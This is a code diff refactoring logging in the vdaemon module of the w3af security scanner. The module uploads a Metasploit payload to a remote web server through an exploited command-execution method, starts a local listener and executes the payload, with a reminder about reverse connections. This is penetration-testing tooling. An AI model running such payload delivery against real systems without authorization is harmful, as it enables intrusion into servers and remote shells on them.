@@ -24,7 +24,6 @@ import os
 import tempfile
 import time
 
-import w3af.core.controllers.output_manager as om
 import w3af.core.data.kb.config as cf
 from w3af.core.controllers.intrusion_tools.exec_method_helpers import (
     get_remote_temp_file,
@@ -49,12 +48,13 @@ class vdaemon:
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
 
-    def __init__(self, exec_method, knowledge_base):
+    def __init__(self, exec_method, knowledge_base, output):
 
         # This is the method that will be used to send the metasploit payload to
         # the remote webserver ( using echo $payload > file )
         self._exec_method = exec_method
         self._knowledge_base = knowledge_base
+        self._output = output
 
         self._metasploit_location = cf.cf.get("msf_location")
         self._msfpayload_path = os.path.join(self._metasploit_location, "msfpayload")
@@ -116,7 +116,7 @@ class vdaemon:
             error_msg = 'Failed to send the payload file, error: "%s".'
             raise BaseFrameworkException(error_msg % e)
         else:
-            om.out.console(
+            self._output.console(
                 "Successfully transfered the MSF payload to the" " remote server."
             )
 
@@ -126,7 +126,7 @@ class vdaemon:
             #
             if not self._start_local_listener(msfcli_handler, msfcli_parameters):
                 error_msg = 'Failed to start the local listener for "%s"'
-                om.out.console(error_msg % payload)
+                self._output.console(error_msg % payload)
             else:
                 try:
                     self._exec_payload(remote_file_location)
@@ -135,7 +135,7 @@ class vdaemon:
                         f"Failed to execute the executable file on the server, error: {e}"
                     )
                 else:
-                    om.out.console(
+                    self._output.console(
                         "Successfully executed the MSF payload on the remote server."
                     )
 
@@ -151,7 +151,7 @@ class vdaemon:
         """
         args = (self._msfcli_path, msfcli_handler, " ".join(parameters))
         msfcli_command = "{} {} {}".format(*args)
-        om.out.console(
+        self._output.console(
             f'Running a new terminal with the payload handler ("{msfcli_command}")'
         )
 
@@ -185,7 +185,7 @@ class vdaemon:
             run_process(command, text=False, stdout=output_file, stderr=None)
 
         if "reverse" in payload:
-            om.out.console(
+            self._output.console(
                 "Remember to setup your firewall to allow the reverse connection!"
             )
 
@@ -213,8 +213,10 @@ class vdaemon:
         :param exe_file: The local path to the executable file
         :return: The name of the remote file that was uploaded.
         """
-        om.out.debug("Called _send_exe_to_server()")
-        om.out.console("Wait while w3af uploads the payload to the remote server...")
+        self._output.debug("Called _send_exe_to_server()")
+        self._output.console(
+            "Wait while w3af uploads the payload to the remote server..."
+        )
 
         ptf = payload_transfer_factory(self._exec_method, self._knowledge_base)
 
@@ -228,15 +230,19 @@ class vdaemon:
                 " can_transfer() returned False."
             )
         else:
-            om.out.debug("The transferHandler can upload files to the remote" " end.")
+            self._output.debug(
+                "The transferHandler can upload files to the remote" " end."
+            )
 
             estimatedTime = transferHandler.estimate_transfer_time(len(exe_file))
-            om.out.debug(
+            self._output.debug(
                 'The payload transfer will take "' + str(estimatedTime) + '" seconds.'
             )
 
-            self._remote_filename = get_remote_temp_file(self._exec_method, om.out)
-            om.out.debug(
+            self._remote_filename = get_remote_temp_file(
+                self._exec_method, self._output
+            )
+            self._output.debug(
                 'Starting payload upload, remote filename is: "'
                 + self._remote_filename
                 + '".'
@@ -246,7 +252,9 @@ class vdaemon:
                 exe_content = exe_handle.read()
 
             if transferHandler.transfer(exe_content, self._remote_filename):
-                om.out.console(f'Finished payload upload to "{self._remote_filename}"')
+                self._output.console(
+                    f'Finished payload upload to "{self._remote_filename}"'
+                )
                 return self._remote_filename
             else:
                 raise BaseFrameworkException(
@@ -268,7 +276,7 @@ class vdaemon:
         """
         A wrapper for executing commands
         """
-        om.out.debug("Executing: " + command)
+        self._output.debug("Executing: " + command)
         response = self._exec_method(*(command,))
-        om.out.debug('"' + command + '" returned: ' + response)
+        self._output.debug('"' + command + '" returned: ' + response)
         return response
